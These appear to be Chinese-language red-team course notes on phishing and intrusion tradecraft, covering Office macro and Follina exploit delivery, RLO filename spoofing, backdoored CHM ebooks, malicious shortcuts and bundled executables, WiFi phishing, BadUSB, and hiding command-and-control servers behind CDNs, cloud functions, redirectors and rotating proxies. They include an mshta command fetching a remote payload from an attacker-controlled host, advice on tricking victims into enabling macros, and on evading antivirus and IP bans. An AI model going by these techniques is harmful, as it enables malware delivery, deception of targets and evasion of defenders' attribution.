## APT
# 宏  

#### office利用



本机office有点问题，完了还没有虚拟机，搞不了。wps上线不了

![image-20250105142805570](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525348.png)

 cs生成宏 

![image-20241226170519193](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525349.png)

 宏上线

![image-20241226172228948](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525350.png)

选择否，选择这里两种格式的文档后缀便可以用宏上线，docx新版的格式是上线不了宏的，而且这两种docm和doc打开后是需要点击启动宏才能完成上线，所以用office钓鱼时就让对方、诱导他启用宏，比如说什么，启动后才能打开啥的、或者启用宏后才能编辑啥的：

![image-20250105141957032](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525352.png)

##### docm：

![image-20250105142328611](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525353.png)

这里需要点击启用宏，所以新版office比较难上线：

![image-20241226172649818](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525354.png)

##### doc:

![image-20250105143216156](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525355.png)

   早期的word版本是可以上线的，现在是需要启动功能后才能上线 .    c2默认生成的宏代码也需要做免杀，	   模版-启动模版宏 ： dotx-dot dotm  	 potx-pot potm 		xlst-xlt xltm  需要改文件格式，保存宏文件需要用到以前的格式来保存

 将新版换成老版本docx-doc&docm	xlsx-xls&xlsm	pptx-ppt&pptm

#### excel利用：

![image-20250105144303467](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525356.png)

诱导目标上钩：

![image-20250105144442922](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525357.png)

pptx-ppt&pptm的这两种ppt&pptm也就不说了。

另一种格式xlsm也可以，就不演示了，过程一样。



#### 模板：

​     模板文件。 所以就可以看文档的后缀来知道是否为钓鱼文件，也不一定

![image-20250105150230550](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525358.png)

保存模板：

![image-20250105150644569](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525359.png)

这里就可以将模板发过去钓鱼：

![image-20250105150928735](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525360.png)

#### CVE ：

CVE      影响office不仅和版本有关，也和内部版本有关，就是内核问题。

这里看着是2021专业增强版，但是CVE是对里面的内部版本也有差异，就是也得看内部版本好是否符合：

![image-20250105151151619](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525361.png)

执行这个命令后如果有计算器弹出，则存在该漏洞cve-2022

![image-20241226164933257](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525362.png)

 复现   这里是用exp生成一个doc文档，然后上传到目标，打开文档后执行写入的脚本命令，远程下载一个后门，并运行，这里对打开的office版本（内部版本号和自身版本）有要求，也要对文档和远程后门进行免杀处理。

先在此目录下开一个8080端口的web服务，方便让后门远程下载后门（8123.exe后门）

![image-20250105153004127](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525363.png)

下来就是用exp的py文件生成一个doc文件，这里的exp原本是用来生成一个nc的doc文档，然后再反弹回来，我们这里是用它生成一个带后门的（远程下载后门）doc文档，所以后面那些什么端口和ip不用管，本来是用于nc反弹的：

先更改远程下载的ip和端口，刚才开的web服务(实战肯定就是 外网ip)：

![image-20250105152919652](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525364.png)

执行命令生成follina.doc文档

![image-20250105153359401](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525365.png)

将生成的文档上传目标，诱导打开（当然后期需要对其进行免杀处理），打开后会将后门下载到指定目录，命名为nc.exe（再py脚本中可以更改）：

![image-20250105153701547](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525366.png)

然后只需要将生成的文档打开就可以实现上线

office历史版本。

   CVE2021：

使用msf上线，就是利用msf生成一个带后门dll文件，再用cve的exp脚本绑定dll文件生成一个docx文档，、

在启动msf监听刚才的dll文件，还需要监听文档。将文档上传到目标上执行，上线msf：

![image-20250105173642808](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525367.png)





  邮件免杀：内容免杀，一般就是拦截关键字，需要注意敏感字



# 

#### RLO后缀

  可以用RIO技术将文件后缀名更改，既更改了文件后缀，又还能执行文件本来功能。

![image-20241226212255269](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525368.png)



#### 电子书

   .CHM  后缀       利用电子书实现无文件上线。利用的是Web投递在电子书中插入

![image-20241226213009850](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525369.png)

编译刚才的html文件为电子书：

![image-20241226214236297](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525370.png)

这里是需要对刚才的powershell命令进行免杀处理

运行生成的chm文件后成功上线：

![image-20241226213815024](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525371.png)

  电子书 是用来解释的，用途类似和readme.md一样，用工具将器反编译出来，在将后门语句插入，在编译出来，然后一打开电子书就执行我们的后门语句。

电子书也比较容易免杀

![image-20241226220516656](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525372.png)

用工具反编译：

![image-20241226220651157](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525373.png)

可以看出来反编译后的和原来的 chm  框架一样：

![image-20241226221229644](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525374.png)

然后将反编译后的index.html修改：

![image-20241226230427249](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525375.png)

在将更改后的html文件保存后将整个x64dbg文件进行编译生成CHM：

![image-20241226230933825](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525376.png)

运行生成的chm，成功上线：

![image-20241226230917063](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525377.png)



电子书大概这是这样，正常反编译后修改，加载自己的后门代码，反返回成chm，执行上线

#### 快捷方式：

hta文档   这里注意，做成的快捷方式的图标最好选用电脑自带的（我的电脑图标），假使目标电脑上没有你图标上的软件，那么就会显示异常或者空白，有两处需要做免杀：1、远程调用执行的命令，2、远程下载的后门文件

先生成一个hta文档。文件托管可以用cs作为服务器来实现远程下载，就跟python -http.server 服务开个端口让远程下载一样：

![image-20241226231436584](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525378.png)

C:\Windows\System32\mshta.exe http://192.168.139.128:89/download/file.ext   放到快捷里面的目标：



![image-20241226232029809](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525379.png)

还有就是要注意：假使目标电脑上没有你图标上的软件，那么就会显示异常或者空白

![image-20241226232332241](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525380.png)

#### 自解压文件：

将两个文件放一个exe里，里面有一个为后门，另一个为正常 ，这个免杀就是做那个为后门的exe

## 复现

这里因为没有自解压的工具，在204的火绒机器自带的，





#### 捆绑：

   将多个软件放到一个， 就是将2个exe融合成一个，而上面的自解压没有改变2个exe，是2个独立的exe。这里捆绑就将2个融为一个exe了，这是两个区别：捆绑是1.exer+2.exe=3.exe   而自解压是1.exer+2.exe =（1.exer+2.exe）

运行后成功上线：

![image-20241226233801398](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525381.png)

  windows自带捆绑器：IExpress 、

![image-20241226234147664](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525382.png)

选择要add的文件、需要捆绑的文件：

![image-20241226234250785](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525383.png)

![image-20241226234407739](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525384.png)

生成的：

![image-20241226234449083](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525385.png)

![image-20241226234655154](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525386.png)



# 近源

不用复现，需要无线网卡设备。

#### wifi 钓鱼：

要用到商业产品。WIFI-Pumpkin3

 要打开kali的VM的插网卡的设置，并且能上网  lsusb ，获取usb设备的网卡，插上后kali的ip里就有wlan0

![image-20241227225603942](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525400.png)

打开WIFI-Pumpkin3工具，配置好，

![image-20241227225724785](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525401.png)

![image-20241227230008144](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525402.png)

然后start后就能在自己这的wifi列表发现刚才设置的xiaodisec网络，这里xiaodiisec没有设置密码：

![image-20241227230108616](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525403.png)

然后一连接就显示出来鱼儿的信息了：

![image-20241227230248100](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525404.png)



就这个样子，结束。 

# 近源

#### BADUSB

就是插有毒的U盘

  需要安装arduinoIDE         插上我们买的U盘，用这个工具arduinoIDE写入我们的后门保存里面，

![image-20241228130335647](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525405.png)

然后只需要将U盘插入目标机器上就可以上线。

这不是U盘病毒，这是usb设备病毒，这插上不会显示多一个盘。就跟鼠标的usb一样。

这原理就是模拟键盘按键，用按键来执行我们写的命令执行上线，那么锁屏情况下就不会上线------锁屏敲不了命令。


# 防溯源

  进程监听工具：

![image-20241229152355206](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525432.png)

 这里就是攻击者的ip，所以需要进行处理保护ip。

#### cdn：

云函数，cdn加速       找CDN有时候也可以用国外服务器请求目标地址来获取真实ip，因为他的cdn加速可能范围可能不是全球范围。

![image-20241229130638655](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525433.png)

超级Ping ,各地ping      是用来加速的域名访问的，加网速，我们可以用来隐藏ip地址。

 配置cdn。 注意，cdn我用的是50g/1年的试用

###### 卡这儿了：

![image-20241229172052132](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525434.png)



 还可以配置ip上线。

就是让你监听到的ip是cdn的ip，不是真实攻击机的ip，防止溯源。



#### 云函数

云函数上线c2

云函数就是给你一个运行代码的接口。也是充当一个中转器，溯源时也只能找到中转地方。而且这里的域名是百度旗下的，不像cdn是自己申请的，域名不一定是白名单域名。所以这里更能过edr

目前腾讯云上线c2已经不行了，腾讯云的api网关触发器不支持了，产品下线了。所以这里更换为百度云。

![image-20241229214514682](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525435.png)

配置云函数（百度云），这里上线注意防火墙

![image-20241229214821128](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525436.png)

用百度云

  科莱         白名单baidu云，蓝队用科莱查看后门的证书，域名解析是白名单，就不容易被发现：

![image-20241229214315206](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525437.png)

这里后门也不是攻击机的ip地址：

![image-20241229214942680](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525438.png)



#### 数据中转

就是在本地144（ip）先生成85.65ip监听器的后门，然后让 85.65在作为中转 转发流量到我们本地144，所以后门最后就在本地上线，而且溯源找的是85.65          85.65服务器上是没有cs的，所以不转发流量的话是上线不了的。

在本地进行中转，只需要在cs上开kali的监听器就可以上线。如果kali没有转发流量，那么就上线不了：

![image-20241229174049846](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525439.png)



#### 反向代理

原理也是中转的，代理么，代理流量（socks），区别就是可视化。当目标排查到ip时会打开你的ip地址端口，这里打开是apache搭建的，为web网页，而上面的中转技术，打开就什么都没有。就是可视化差异。

![image-20241229175342695](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525440.png)

假如在kali2上搭建web，他有apache服务，那么打开就可以发现是个apache服务。



# 代理池

蓝队就比较注重ip溯源，经常封ip，拉黑。那么我们红队被拉黑或者快被拉黑时怎么处理：

主要是一下方法：

1. 物联网卡+移动WIFI设备------会一直换ip
2. 云平台云函数接口调用-----推荐用国外的，不用实名
3. 自建代理池+隧道代理--------推荐使用，需要付费。
4. 机场节点+clash.meta+隧道代理（翻墙）

代理池实战时就买个付费的代理，这节测试就用本地代理池，免费版本的，

  快代理产品建立代理池，每次请求都会变ip。

这里以快代理这个产品为例-----隧道代理，每次请求换ip：

![image-20241230181736498](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525441.png)

![image-20241230201345469](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525442.png)

 浏览器配置代理，配好后就可以访问ip138，发现每次访问的地址都会变。

![image-20241230201813826](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525443.png)

刷新当前ip，每次刷新都会变：

![image-20241230202045006](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525444.png)

本机cmd配置代理，用代理工具Proxyfier，socks代理。

cmd命令：

![image-20241230202823989](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525446.png)

配置代理工具：

![image-20241230203009853](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525447.png)

![image-20241230203109708](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525448.png)

访问cip.cc，发现ip会一直变：

![image-20241230203623435](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525449.png)

注意：这里因为本地的外网ip一直变化，所以没有办法添加白名单，所以每次用快代理时候都得输入账户密码：

![image-20241230203518722](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525450.png)

![image-20241230203543315](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525451.png)

 goby走代理。如果有的工具没有代理，那就用Proxyfier这类代理工具，让我们的测试工具走代理。

![image-20241230204003697](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525452.png)

 梯子----clash配置代理，实现相同的功能---每次访问目标时自己的ip都变。适用于小流量测试，大流量时候容易掉线，掉线就叽叽叽，自己原ip就暴露了。

![image-20241230204430280](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525453.png)

这里代理的ip每次访问都一样，得重启工具才能换代理ip，所以这里写规则让他每次请求都会换ip。，这里没有成功配置，下来有需求在回来看。

代理技术在整个渗透中都能用到，

 用waf进行，edr拦截。 让设备告警，没办法，只能魔改自己的webshell工具。

安全狗：扫网站，直接被拉黑ip。然后就挂代理，继续访问目标网站。

![image-20241230205415350](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525454.png)

然后就挂代理进行扫网站，一直封一直扫，一直换ip。先用御剑进行目录扫描、一开扫就被封了：

![image-20241230210153181](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525455.png)

挂上代理后就不会被封，封一个换一个、换比封的快：

![image-20241230210240152](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525456.png)

![image-20241230210444865](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525457.png)

日志记录：

![image-20241230210406688](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525458.png)

挂上代理后的日志、可以看出来，封一个换一个ip接着扫：

![image-20241230210524121](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525459.png)

演示，用工具扫网站，观察目标服务器上的安全狗拦截。这里注意：代理只是换个通讯，并不能换你的攻击流量，比如有的攻击能够拦截你的攻击流量，那么你就算换ip通讯也不行。

和上面一样，还是扫后被封ip，然后需要挂代理，可以选择你扫目标用的exe，给exe用上代理。


